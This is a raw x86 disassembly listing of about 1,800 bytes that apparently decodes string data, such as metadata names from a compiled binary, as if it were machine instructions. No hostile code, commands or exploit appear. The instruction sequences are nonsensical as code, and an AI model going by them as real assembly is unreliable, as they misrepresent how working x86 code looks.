  40878e:	popa   
  40878f:	outs   dx,BYTE PTR ds:[esi]
  408790:	addr16 jne 0x4087f4
  408793:	add    BYTE PTR gs:[bx+0x65],ah
  408798:	je     0x4087f9
  40879a:	push   esi
  40879b:	gs jb  0x408811
  40879e:	imul   ebp,DWORD PTR [edi+0x6e],0x74657300
  4087a5:	pop    edi
  4087a6:	push   esi
  4087a7:	gs jb  0x40881d
  4087aa:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4087b1:	pop    edi
  4087b2:	inc    esp
  4087b3:	popa   
  4087b4:	je     0x408817
  4087b6:	push   ebx
  4087b7:	gs jb  0x408830
  4087ba:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  4087c1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4087c6:	outs   dx,BYTE PTR ds:[esi]
  4087c7:	add    BYTE PTR [ebx+0x65],dh
  4087ca:	je     0x40882b
  4087cc:	inc    esp
  4087cd:	popa   
  4087ce:	je     0x408831
  4087d0:	push   ebx
  4087d1:	gs jb  0x40884a
  4087d4:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  4087db:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4087e0:	outs   dx,BYTE PTR ds:[esi]
  4087e1:	add    BYTE PTR [edi+0x65],ah
  4087e4:	je     0x408845
  4087e6:	push   ebp
  4087e7:	jb     0x408852
  4087e9:	add    BYTE PTR [ebx+0x65],dh
  4087ec:	je     0x40884d
  4087ee:	push   ebp
  4087ef:	jb     0x40885a
  4087f1:	add    BYTE PTR [ecx+0x75],al
  4087f4:	je     0x408865
  4087f6:	push   eax
  4087f7:	outs   dx,DWORD PTR ds:[esi]
  4087f8:	jo     0x40886f
  4087fa:	ins    BYTE PTR es:[edi],dx
  4087fb:	popa   
  4087fc:	je     0x408863
  4087fe:	inc    ecx
  4087ff:	outs   dx,BYTE PTR ds:[esi]
  408800:	fs push esi
  408802:	popa   
  408803:	ins    BYTE PTR es:[edi],dx
  408804:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x61560065
  40880c:	ins    BYTE PTR es:[edi],dx
  40880d:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x656e4f65
  408815:	inc    ecx
  408816:	outs   dx,BYTE PTR ds:[esi]
  408817:	fs dec edi
  408819:	outs   dx,BYTE PTR ds:[esi]
  40881a:	ins    BYTE PTR es:[edi],dx
  40881b:	jns    0x40886c
  40881d:	outs   dx,BYTE PTR ds:[esi]
  40881e:	gs inc esi
  408820:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x65756c61
  408828:	add    BYTE PTR [edi+0x65],al
  40882b:	je     0x40886e
  40882d:	jo     0x40889f
  40882f:	push   ebx
  408830:	gs je  0x4088a7
  408833:	imul   ebp,DWORD PTR [esi+0x67],0x6c615600
  40883a:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x72694465
  408842:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  408847:	jns    0x40888e
  408849:	js     0x4088b4
  40884b:	jae    0x4088c1
  40884d:	jae    0x40884f
  40884f:	push   esi
  408850:	popa   
  408851:	ins    BYTE PTR es:[edi],dx
  408852:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x74615065
  40885a:	push   0x46736148
  40885f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x6e],0x656d61
  408867:	dec    ebp
  408868:	outs   dx,DWORD PTR ds:[esi]
  408869:	fs add BYTE PTR gs:[ecx+0x6e],cl
  40886e:	add    BYTE PTR [edi+0x75],cl
  408871:	je     0x408873
  408873:	dec    esp
  408874:	popa   
  408875:	outs   dx,BYTE PTR ds:[esi]
  408876:	addr16 jne 0x4088da
  408879:	add    BYTE PTR gs:[bp+0x65],dl
  40887e:	jb     0x4088f3
  408880:	imul   ebp,DWORD PTR [edi+0x6e],0x74614400
  408887:	popa   
  408888:	push   ebx
  408889:	gs jb  0x408902
  40888c:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  408893:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408898:	outs   dx,BYTE PTR ds:[esi]
  408899:	add    BYTE PTR [esi+0x31],dl
  40889c:	add    BYTE PTR [esi+0x32],dl
  40889f:	add    BYTE PTR [ecx+0x70],al
  4088a2:	jo     0x408910
  4088a4:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4088ab:	dec    esp
  4088ac:	outs   dx,DWORD PTR ds:[esi]
  4088ad:	outs   dx,DWORD PTR ds:[si]
  4088af:	add    BYTE PTR [ebp+0x73],dl
  4088b2:	popa   
  4088b3:	addr16 gs push esp
  4088b6:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x74656700
  4088be:	pop    edi
  4088bf:	push   edi
  4088c0:	jb     0x40892b
  4088c2:	je     0x40892d
  4088c4:	outs   dx,BYTE PTR ds:[esi]
  4088c5:	addr16 dec edi
  4088c7:	bound  ebp,QWORD PTR [edx+0x65]
  4088ca:	arpl   WORD PTR [esp+ecx*2+0x61],si
  4088ce:	jns    0x408935
  4088d0:	jb     0x408918
  4088d2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x656e6547
  4088da:	jb     0x40893d
  4088dc:	je     0x408947
  4088de:	outs   dx,DWORD PTR ds:[esi]
  4088df:	outs   dx,BYTE PTR ds:[esi]
  4088e0:	inc    ebx
  4088e1:	outs   dx,DWORD PTR ds:[esi]
  4088e2:	ins    DWORD PTR es:[edi],dx
  4088e3:	jo     0x408951
  4088e5:	gs je  0x40894d
  4088e8:	add    BYTE PTR [ebp+0x73],dl
  4088eb:	popa   
  4088ec:	addr16 gs dec esi
  4088ef:	popa   
  4088f0:	ins    DWORD PTR es:[edi],dx
  4088f1:	gs inc ecx
  4088f3:	outs   dx,BYTE PTR ds:[esi]
  4088f4:	fs push esi
  4088f6:	popa   
  4088f7:	ins    BYTE PTR es:[edi],dx
  4088f8:	jne    0x40895f
  4088fa:	dec    esi
  4088fb:	popa   
  4088fc:	ins    DWORD PTR es:[edi],dx
  4088fd:	add    BYTE PTR gs:[ebp+0x73],dl
  408901:	popa   
  408902:	addr16 gs dec esi
  408905:	popa   
  408906:	ins    DWORD PTR es:[edi],dx
  408907:	gs inc ecx
  408909:	outs   dx,BYTE PTR ds:[esi]
  40890a:	fs inc ebp
  40890c:	outs   dx,BYTE PTR ds:[esi]
  40890d:	jne    0x40897c
  40890f:	add    BYTE PTR [ebp+0x73],dl
  408912:	popa   
  408913:	addr16 gs inc esp
  408916:	gs jae 0x40897c
  408919:	jb     0x408984
  40891b:	jo     0x408991
  40891d:	imul   ebp,DWORD PTR [edi+0x6e],0x53646e41
  408924:	push   0x4674726f
  408929:	outs   dx,DWORD PTR ds:[esi]
  40892a:	jb     0x408999
  40892c:	add    BYTE PTR [edi+0x65],ah
  40892f:	je     0x408990
  408931:	push   ebp
  408932:	jae    0x408995
  408934:	addr16 gs push ebp
  408937:	jb     0x4089a2
  408939:	inc    esp
  40893a:	gs jae 0x4089a0
  40893d:	jb     0x4089a8
  40893f:	jo     0x4089b5
  408941:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  408948:	pop    edi
  408949:	push   ebp
  40894a:	jae    0x4089ad
  40894c:	addr16 gs dec eax
  40894f:	gs ins BYTE PTR es:[edi],dx
  408951:	jo     0x408997
  408953:	gs jae 0x4089b9
  408956:	jb     0x4089c1
  408958:	jo     0x4089ce
  40895a:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  408961:	pop    edi
  408962:	push   ebp
  408963:	jae    0x4089c6
  408965:	addr16 gs dec ecx
  408968:	outs   dx,BYTE PTR ds:[esi]
  408969:	inc    ebx
  40896a:	jae    0x4089d0
  40896c:	ins    BYTE PTR es:[edi],dx
  40896d:	inc    esp
  40896e:	gs jae 0x4089d4
  408971:	jb     0x4089dc
  408973:	jo     0x4089e9
  408975:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  40897c:	pop    edi
  40897d:	push   ebp
  40897e:	jae    0x4089e1
  408980:	addr16 gs dec edi
  408983:	jne    0x4089f9
  408985:	dec    edi
  408986:	bound  ebp,QWORD PTR [edx+0x65]
  408989:	arpl   WORD PTR [esp+ecx*2+0x61],si
  40898d:	jns    0x4089f4
  40898f:	jb     0x4089d5
  408991:	gs jae 0x4089f7
  408994:	jb     0x4089ff
  408996:	jo     0x408a0c
  408998:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  40899f:	pop    edi
  4089a0:	push   ebp
  4089a1:	jae    0x408a04
  4089a3:	addr16 gs dec esp
  4089a6:	popa   
  4089a7:	outs   dx,BYTE PTR ds:[esi]
  4089a8:	addr16 jne 0x408a0c
  4089ab:	addr16 gs inc ebx
  4089ae:	push   ebx
  4089af:	push   0x44707261
  4089b4:	gs jae 0x408a1a
  4089b7:	jb     0x408a22
  4089b9:	jo     0x408a2f
  4089bb:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4089c2:	pop    edi
  4089c3:	push   ebp
  4089c4:	jae    0x408a27
  4089c6:	addr16 gs dec esp
  4089c9:	popa   
  4089ca:	outs   dx,BYTE PTR ds:[esi]
  4089cb:	addr16 jne 0x408a2f
  4089ce:	addr16 gs push esi
  4089d1:	bound  eax,QWORD PTR [ebp+eiz*2+0x73]
  4089d5:	arpl   WORD PTR [edx+0x69],si
  4089d8:	jo     0x408a4e
  4089da:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4089e1:	pop    edi
  4089e2:	push   ebp
  4089e3:	jae    0x408a46
  4089e5:	addr16 gs dec esi
  4089e8:	outs   dx,DWORD PTR ds:[esi]
  4089e9:	dec    esp
  4089ea:	outs   dx,DWORD PTR ds:[esi]
  4089eb:	outs   dx,DWORD PTR ds:[si]
  4089ed:	inc    esp
  4089ee:	gs jae 0x408a54
  4089f1:	jb     0x408a5c
  4089f3:	jo     0x408a69
  4089f5:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4089fc:	pop    edi
  4089fd:	push   ebp
  4089fe:	jae    0x408a61
  408a00:	addr16 gs push ebp
  408a03:	jb     0x408a6e
  408a05:	push   esi
  408a06:	popa   
  408a07:	ins    BYTE PTR es:[edi],dx
  408a08:	jne    0x408a6f
  408a0a:	dec    esi
  408a0b:	popa   
  408a0c:	ins    DWORD PTR es:[edi],dx
  408a0d:	add    BYTE PTR gs:[edi+0x65],ah
  408a11:	je     0x408a72
  408a13:	push   ebp
  408a14:	jae    0x408a77
  408a16:	addr16 gs inc esi
  408a19:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x65756c61
  408a21:	dec    esi
  408a22:	popa   
  408a23:	ins    DWORD PTR es:[edi],dx
  408a24:	add    BYTE PTR gs:[edi+0x65],ah
  408a28:	je     0x408a89
  408a2a:	push   ebp
  408a2b:	jae    0x408a8e
  408a2d:	addr16 gs inc esp
  408a30:	popa   
  408a31:	je     0x408a94
  408a33:	push   ebx
  408a34:	gs jb  0x408aad
  408a37:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  408a3e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408a43:	outs   dx,BYTE PTR ds:[esi]
  408a44:	add    BYTE PTR [edi+0x65],ah
  408a47:	je     0x408aa8
  408a49:	push   ebp
  408a4a:	jae    0x408aad
  408a4c:	addr16 gs push esi
  408a4f:	gs jb  0x408ac5
  408a52:	imul   ebp,DWORD PTR [edi+0x6e],0x746f4431
  408a59:	xor    BYTE PTR [eax],al
  408a5b:	addr16 gs je 0x408abe
  408a5f:	push   ebp
  408a60:	jae    0x408ac3
  408a62:	addr16 gs push esi
  408a65:	gs jb  0x408adb
  408a68:	imul   ebp,DWORD PTR [edi+0x6e],0x746f4432
  408a6f:	xor    BYTE PTR [eax],al
  408a71:	addr16 gs je 0x408ad4
  408a75:	inc    ebp
  408a76:	js     0x408ad9
  408a78:	ins    DWORD PTR es:[edi],dx
  408a79:	jo     0x408ae7
  408a7b:	gs push esp
  408a7d:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x61784500
  408a85:	ins    DWORD PTR es:[edi],dx
  408a86:	jo     0x408af4
  408a88:	gs xor al,0x0
  408a8b:	addr16 gs je 0x408aee
  408a8f:	inc    ebp
  408a90:	js     0x408af3
  408a92:	ins    DWORD PTR es:[edi],dx
  408a93:	jo     0x408b01
  408a95:	gs xor al,0x44
  408a98:	gs jae 0x408afe
  408a9b:	jb     0x408b06
  408a9d:	jo     0x408b13
  408a9f:	imul   ebp,DWORD PTR [edi+0x6e],0x61784500
  408aa6:	ins    DWORD PTR es:[edi],dx
  408aa7:	jo     0x408b15
  408aa9:	gs xor eax,0x74656700
  408aaf:	pop    edi
  408ab0:	inc    ebp
  408ab1:	js     0x408b14
  408ab3:	ins    DWORD PTR es:[edi],dx
  408ab4:	jo     0x408b22
  408ab6:	gs xor eax,0x63736544
  408abc:	jb     0x408b27
  408abe:	jo     0x408b34
  408ac0:	imul   ebp,DWORD PTR [edi+0x6e],0x61784500
  408ac7:	ins    DWORD PTR es:[edi],dx
  408ac8:	jo     0x408b36
  408aca:	gs add BYTE PTR ss:[edi+0x65],ah
  408acf:	je     0x408b30
  408ad1:	inc    ebp
  408ad2:	js     0x408b35
  408ad4:	ins    DWORD PTR es:[edi],dx
  408ad5:	jo     0x408b43
  408ad7:	gs ss inc esp
  408ada:	gs jae 0x408b40
  408add:	jb     0x408b48
  408adf:	jo     0x408b55
  408ae1:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  408ae8:	pop    edi
  408ae9:	dec    esi
  408aea:	outs   dx,DWORD PTR ds:[esi]
  408aeb:	inc    ecx
  408aec:	jb     0x408b55
  408aee:	jne    0x408b5d
  408af0:	outs   dx,BYTE PTR gs:[esi]
  408af2:	je     0x408b67
  408af4:	add    BYTE PTR [edi+0x65],ah
  408af7:	je     0x408b58
  408af9:	inc    ebp
  408afa:	fs ins DWORD PTR es:[edi],dx
  408afc:	push   ebx
  408afd:	arpl   WORD PTR [eax+0x65],bp
  408b00:	ins    DWORD PTR es:[edi],dx
  408b01:	popa   
  408b02:	inc    ebp
  408b03:	jb     0x408b77
  408b05:	outs   dx,DWORD PTR ds:[esi]
  408b06:	jb     0x408b5b
  408b08:	gs jbe 0x408b70
  408b0b:	jb     0x408b76
  408b0d:	je     0x408b88
  408b0f:	inc    ebp
  408b10:	jb     0x408b84
  408b12:	outs   dx,DWORD PTR ds:[esi]
  408b13:	jb     0x408b15
  408b15:	addr16 gs je 0x408b78
  408b19:	inc    ebp
  408b1a:	fs ins DWORD PTR es:[edi],dx
  408b1c:	push   ebx
  408b1d:	arpl   WORD PTR [eax+0x65],bp
  408b20:	ins    DWORD PTR es:[edi],dx
  408b21:	popa   
  408b22:	inc    ebp
  408b23:	jb     0x408b97
  408b25:	outs   dx,DWORD PTR ds:[esi]
  408b26:	jb     0x408b7b
  408b28:	gs jbe 0x408b90
  408b2b:	jb     0x408b96
  408b2d:	je     0x408ba8
  408b2f:	push   edi
  408b30:	popa   
  408b31:	jb     0x408ba1
  408b33:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  408b3a:	pop    edi
  408b3b:	inc    ebp
  408b3c:	fs ins DWORD PTR es:[edi],dx
  408b3e:	push   ebx
  408b3f:	arpl   WORD PTR [eax+0x65],bp
  408b42:	ins    DWORD PTR es:[edi],dx
  408b43:	popa   
  408b44:	inc    ebp
  408b45:	jb     0x408bb9
  408b47:	outs   dx,DWORD PTR ds:[esi]
  408b48:	jb     0x408b9d
  408b4a:	gs jbe 0x408bb2
  408b4d:	jb     0x408bb8
  408b4f:	je     0x408bca
  408b51:	push   ebp
  408b52:	outs   dx,BYTE PTR ds:[esi]
  408b53:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  408b57:	outs   dx,BYTE PTR ds:[esi]
  408b58:	add    BYTE PTR [edi+0x65],ah
  408b5b:	je     0x408bbc
  408b5d:	inc    esi
  408b5e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x55],0x6f6e6b6e
  408b66:	ja     0x408bd6
  408b68:	add    BYTE PTR [edi+0x65],ah
  408b6b:	je     0x408bcc
  408b6d:	inc    ebp
  408b6e:	js     0x408bd3
  408b70:	ins    BYTE PTR es:[edi],dx
  408b71:	jne    0x408be6
  408b73:	imul   esi,DWORD PTR [esi+0x65],0x697255
  408b7a:	addr16 gs je 0x408bdd
  408b7e:	push   esi
  408b7f:	gs jb  0x408bf5
  408b82:	imul   ebp,DWORD PTR [edi+0x6e],0x65523156
  408b89:	jno    0x408c00
  408b8b:	imul   esi,DWORD PTR [edx+0x65],0x65735573
  408b92:	inc    esp
  408b93:	popa   
  408b94:	je     0x408bf7
  408b96:	push   ebx
  408b97:	gs jb  0x408c10
  408b9a:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  408ba1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408ba6:	outs   dx,BYTE PTR ds:[esi]
  408ba7:	inc    esi
  408ba8:	popa   
  408ba9:	ins    BYTE PTR es:[edi],dx
  408baa:	jae    0x408c11
  408bac:	add    BYTE PTR [edi+0x72],dl
  408baf:	imul   esi,DWORD PTR [ecx+ebp*2+0x6e],0x6a624f67
  408bb7:	arpl   WORD PTR gs:[esp+ecx*2+0x61],si
  408bbc:	jns    0x408c23
  408bbe:	jb     0x408c06
  408bc0:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x67617355
  408bc8:	gs push ebp
  408bca:	jb     0x408c35
  408bcc:	inc    esp
  408bcd:	gs jae 0x408c33
  408bd0:	jb     0x408c3b
  408bd2:	jo     0x408c48
  408bd4:	imul   ebp,DWORD PTR [edi+0x6e],0x61735500
  408bdb:	addr16 gs dec eax
  408bde:	gs ins BYTE PTR es:[edi],dx
  408be0:	jo     0x408c26
  408be2:	gs jae 0x408c48
  408be5:	jb     0x408c50
  408be7:	jo     0x408c5d
  408be9:	imul   ebp,DWORD PTR [edi+0x6e],0x61735500
  408bf0:	addr16 gs dec ecx
  408bf3:	outs   dx,BYTE PTR ds:[esi]
  408bf4:	inc    ebx
  408bf5:	jae    0x408c5b
  408bf7:	ins    BYTE PTR es:[edi],dx
  408bf8:	inc    esp
  408bf9:	gs jae 0x408c5f
  408bfc:	jb     0x408c67
  408bfe:	jo     0x408c74
  408c00:	imul   ebp,DWORD PTR [edi+0x6e],0x61735500
  408c07:	addr16 gs dec edi
  408c0a:	jne    0x408c80
  408c0c:	dec    edi
  408c0d:	bound  ebp,QWORD PTR [edx+0x65]
  408c10:	arpl   WORD PTR [esp+ecx*2+0x61],si
  408c14:	jns    0x408c7b
  408c16:	jb     0x408c5c
  408c18:	gs jae 0x408c7e
  408c1b:	jb     0x408c86
  408c1d:	jo     0x408c93
  408c1f:	imul   ebp,DWORD PTR [edi+0x6e],0x61735500
  408c26:	addr16 gs dec esp
  408c29:	popa   
  408c2a:	outs   dx,BYTE PTR ds:[esi]
  408c2b:	addr16 jne 0x408c8f
  408c2e:	addr16 gs inc ebx
  408c31:	push   ebx
  408c32:	push   0x44707261
  408c37:	gs jae 0x408c9d
  408c3a:	jb     0x408ca5
  408c3c:	jo     0x408cb2
  408c3e:	imul   ebp,DWORD PTR [edi+0x6e],0x61735500
  408c45:	addr16 gs dec esp
  408c48:	popa   
  408c49:	outs   dx,BYTE PTR ds:[esi]
  408c4a:	addr16 jne 0x408cae
  408c4d:	addr16 gs push esi
  408c50:	bound  eax,QWORD PTR [ebp+eiz*2+0x73]
  408c54:	arpl   WORD PTR [edx+0x69],si
  408c57:	jo     0x408ccd
  408c59:	imul   ebp,DWORD PTR [edi+0x6e],0x61735500
  408c60:	addr16 gs dec esi
  408c63:	outs   dx,DWORD PTR ds:[esi]
  408c64:	dec    esp
  408c65:	outs   dx,DWORD PTR ds:[esi]
  408c66:	outs   dx,DWORD PTR ds:[si]
  408c68:	inc    esp
  408c69:	gs jae 0x408ccf
  408c6c:	jb     0x408cd7
  408c6e:	jo     0x408ce4
  408c70:	imul   ebp,DWORD PTR [edi+0x6e],0x61735500
  408c77:	addr16 gs push ebp
  408c7a:	jb     0x408ce5
  408c7c:	push   esi
  408c7d:	popa   
  408c7e:	ins    BYTE PTR es:[edi],dx
  408c7f:	jne    0x408ce6
  408c81:	dec    esi
  408c82:	popa   
  408c83:	ins    DWORD PTR es:[edi],dx
  408c84:	add    BYTE PTR gs:[ebp+0x73],dl
  408c88:	popa   
  408c89:	addr16 gs inc esi
  408c8c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x65756c61
  408c94:	dec    esi
  408c95:	popa   
  408c96:	ins    DWORD PTR es:[edi],dx
  408c97:	add    BYTE PTR gs:[ebp+0x73],dl
  408c9b:	popa   
  408c9c:	addr16 gs inc esp
  408c9f:	popa   
  408ca0:	je     0x408d03
  408ca2:	push   ebx
  408ca3:	gs jb  0x408d1c
  408ca6:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  408cad:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408cb2:	outs   dx,BYTE PTR ds:[esi]
  408cb3:	add    BYTE PTR [ebp+0x73],dl
  408cb6:	popa   
  408cb7:	addr16 gs push esi
  408cba:	gs jb  0x408d30
  408cbd:	imul   ebp,DWORD PTR [edi+0x6e],0x746f4431
  408cc4:	xor    BYTE PTR [eax],al
  408cc6:	push   ebp
  408cc7:	jae    0x408d2a
  408cc9:	addr16 gs push esi
  408ccc:	gs jb  0x408d42
  408ccf:	imul   ebp,DWORD PTR [edi+0x6e],0x746f4432
  408cd6:	xor    BYTE PTR [eax],al
  408cd8:	inc    ebp
  408cd9:	js     0x408d3c
  408cdb:	ins    DWORD PTR es:[edi],dx
  408cdc:	jo     0x408d4a
  408cde:	gs push esp
  408ce0:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x61784500
  408ce8:	ins    DWORD PTR es:[edi],dx
  408ce9:	jo     0x408d57
  408ceb:	gs xor al,0x44
  408cee:	gs jae 0x408d54
  408cf1:	jb     0x408d5c
  408cf3:	jo     0x408d69
  408cf5:	imul   ebp,DWORD PTR [edi+0x6e],0x61784500
  408cfc:	ins    DWORD PTR es:[edi],dx
  408cfd:	jo     0x408d6b
  408cff:	gs xor eax,0x63736544
  408d05:	jb     0x408d70
  408d07:	jo     0x408d7d
  408d09:	imul   ebp,DWORD PTR [edi+0x6e],0x61784500
  408d10:	ins    DWORD PTR es:[edi],dx
  408d11:	jo     0x408d7f
  408d13:	gs ss inc esp
  408d16:	gs jae 0x408d7c
  408d19:	jb     0x408d84
  408d1b:	jo     0x408d91
  408d1d:	imul   ebp,DWORD PTR [edi+0x6e],0x6d644500
  408d24:	push   ebx
  408d25:	arpl   WORD PTR [eax+0x65],bp
  408d28:	ins    DWORD PTR es:[edi],dx
  408d29:	popa   
  408d2a:	inc    ebp
  408d2b:	jb     0x408d9f
  408d2d:	outs   dx,DWORD PTR ds:[esi]
  408d2e:	jb     0x408d83
  408d30:	gs jbe 0x408d98
  408d33:	jb     0x408d9e
  408d35:	je     0x408db0
  408d37:	inc    ebp
  408d38:	jb     0x408dac
  408d3a:	outs   dx,DWORD PTR ds:[esi]
  408d3b:	jb     0x408d3d
  408d3d:	inc    ebp
  408d3e:	fs ins DWORD PTR es:[edi],dx
  408d40:	push   ebx
  408d41:	arpl   WORD PTR [eax+0x65],bp
  408d44:	ins    DWORD PTR es:[edi],dx
  408d45:	popa   
  408d46:	inc    ebp
  408d47:	jb     0x408dbb
  408d49:	outs   dx,DWORD PTR ds:[esi]
  408d4a:	jb     0x408d9f
  408d4c:	gs jbe 0x408db4
  408d4f:	jb     0x408dba
  408d51:	je     0x408dcc
  408d53:	push   edi
  408d54:	popa   
  408d55:	jb     0x408dc5
  408d57:	imul   ebp,DWORD PTR [esi+0x67],0x6d644500
  408d5e:	push   ebx
  408d5f:	arpl   WORD PTR [eax+0x65],bp
  408d62:	ins    DWORD PTR es:[edi],dx
  408d63:	popa   
  408d64:	inc    ebp
  408d65:	jb     0x408dd9
  408d67:	outs   dx,DWORD PTR ds:[esi]
  408d68:	jb     0x408dbd
  408d6a:	gs jbe 0x408dd2
  408d6d:	jb     0x408dd8
  408d6f:	je     0x408dea
  408d71:	push   ebp
  408d72:	outs   dx,BYTE PTR ds:[esi]
  408d73:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  408d77:	outs   dx,BYTE PTR ds:[esi]
  408d78:	add    BYTE PTR [esi+0x69],al
  408d7b:	ins    BYTE PTR es:[edi],dx
  408d7c:	gs push ebp
  408d7e:	outs   dx,BYTE PTR ds:[esi]
  408d7f:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  408d83:	outs   dx,BYTE PTR ds:[esi]
  408d84:	add    BYTE PTR [ecx+0x72],al
  408d87:	addr16 jne 0x408df7
  408d8a:	outs   dx,BYTE PTR gs:[esi]
  408d8c:	je     0x408ddc
  408d8e:	jne    0x408dfc
  408d90:	ins    BYTE PTR es:[edi],dx
  408d91:	add    BYTE PTR [ecx+0x72],al
  408d94:	addr16 jne 0x408e04
  408d97:	outs   dx,BYTE PTR gs:[esi]
  408d99:	je     0x408dea
  408d9b:	jne    0x408e11
  408d9d:	dec    edi
  408d9e:	push   dx
  408da0:	popa   
  408da1:	outs   dx,BYTE PTR ds:[esi]
  408da2:	add    BYTE PTR gs:[bp+0x6f],cl
  408da7:	je     0x408df2
  408da9:	ins    DWORD PTR es:[edi],dx
  408daa:	jo     0x408e18
  408dac:	gs ins DWORD PTR es:[edi],dx
  408dae:	outs   dx,BYTE PTR gs:[esi]
  408db0:	je     0x408e17
  408db2:	add    BYTE PTR fs:[esi+0x6f],cl
  408db6:	je     0x408e0b
  408db8:	jne    0x408e2a
  408dba:	jo     0x408e2b
  408dbc:	jb     0x408e32
  408dbe:	gs add BYTE PTR fs:[edi+0x65],bl
  408dc3:	jb     0x408e37
  408dc5:	outs   dx,DWORD PTR ds:[esi]
  408dc6:	jb     0x408e0b
  408dc8:	outs   dx,DWORD PTR ds:[esi]
  408dc9:	fs add BYTE PTR gs:[edi+0x65],ah
  408dce:	je     0x408e2f
  408dd0:	inc    ebp
  408dd1:	jb     0x408e45
  408dd3:	outs   dx,DWORD PTR ds:[esi]
  408dd4:	jb     0x408e19
  408dd6:	outs   dx,DWORD PTR ds:[esi]
  408dd7:	fs add BYTE PTR gs:[ebp+0x72],al
  408ddc:	jb     0x408e4d
  408dde:	jb     0x408e23
  408de0:	outs   dx,DWORD PTR ds:[esi]
  408de1:	fs add BYTE PTR gs:[ecx+ebp*2+0x74],dl
  408de7:	ins    BYTE PTR es:[edi],dx
  408de8:	add    BYTE PTR gs:[ebp+eiz*2+0x66],al
  408ded:	popa   
  408dee:	jne    0x408e5c
  408df0:	je     0x408e33
  408df2:	ins    BYTE PTR es:[edi],dx
  408df3:	imul   esp,DWORD PTR [ecx+0x73],0x706f4300
  408dfa:	jns    0x408e6e
  408dfc:	imul   esp,DWORD PTR [edi+0x68],0x6e490074
  408e03:	outs   dx,WORD PTR ds:[esi]
  408e05:	jb     0x408e74
  408e07:	popa   
  408e08:	je     0x408e73
  408e0a:	outs   dx,DWORD PTR ds:[esi]
  408e0b:	outs   dx,BYTE PTR ds:[esi]
  408e0c:	popa   
  408e0d:	ins    BYTE PTR es:[edi],dx
  408e0e:	push   esi
  408e0f:	gs jb  0x408e85
  408e12:	imul   ebp,DWORD PTR [edi+0x6e],0x69614400
  408e19:	ins    BYTE PTR es:[edi],dx
  408e1a:	jns    0x408e5e
  408e1c:	jne    0x408e87
  408e1e:	ins    BYTE PTR es:[edi],dx
  408e1f:	fs dec esi
  408e21:	jne    0x408e90
  408e23:	bound  esp,QWORD PTR [ebp+0x72]
  408e26:	add    BYTE PTR [ebp+0x63],al
  408e29:	ins    DWORD PTR es:[edi],dx
  408e2a:	popa   
  408e2b:	push   eax
  408e2c:	jne    0x408e90
  408e2e:	ins    BYTE PTR es:[edi],dx
  408e2f:	imul   esp,DWORD PTR [ebx+0x4b],0x45007965
  408e36:	arpl   WORD PTR [ebp+0x61],bp
  408e39:	push   eax
  408e3a:	jne    0x408e9e
  408e3c:	ins    BYTE PTR es:[edi],dx
  408e3d:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  408e44:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  408e48:	inc    ebp
  408e49:	arpl   WORD PTR [ebp+0x61],bp
  408e4c:	push   eax
  408e4d:	jne    0x408eb1
  408e4f:	ins    BYTE PTR es:[edi],dx
  408e50:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  408e57:	ins    BYTE PTR es:[edi],dx
  408e58:	ins    BYTE PTR es:[edi],dx
  408e59:	add    BYTE PTR [ebp+0x73],cl
  408e5c:	arpl   WORD PTR [edi+0x72],bp
  408e5f:	ins    BYTE PTR es:[edi],dx
  408e60:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  408e67:	gs ins DWORD PTR es:[edi],dx
  408e69:	inc    esp
  408e6a:	popa   
  408e6b:	je     0x408ece
  408e6d:	add    BYTE PTR [ebx+0x79],dl
  408e70:	jae    0x408ee6
  408e72:	gs ins DWORD PTR es:[edi],dx
  408e74:	inc    esp
  408e75:	popa   
  408e76:	je     0x408ed9
  408e78:	dec    edi
  408e79:	jb     0x408edc
  408e7b:	arpl   WORD PTR [ebp+eiz*2+0x43],bp
  408e7f:	ins    BYTE PTR es:[edi],dx
  408e80:	imul   esp,DWORD PTR [ebp+0x6e],0x79530074
  408e87:	jae    0x408efd
  408e89:	gs ins DWORD PTR es:[edi],dx
  408e8b:	push   edx
  408e8c:	jne    0x408efc
  408e8e:	je     0x408ef9
  408e90:	ins    DWORD PTR es:[edi],dx
  408e91:	gs push edx
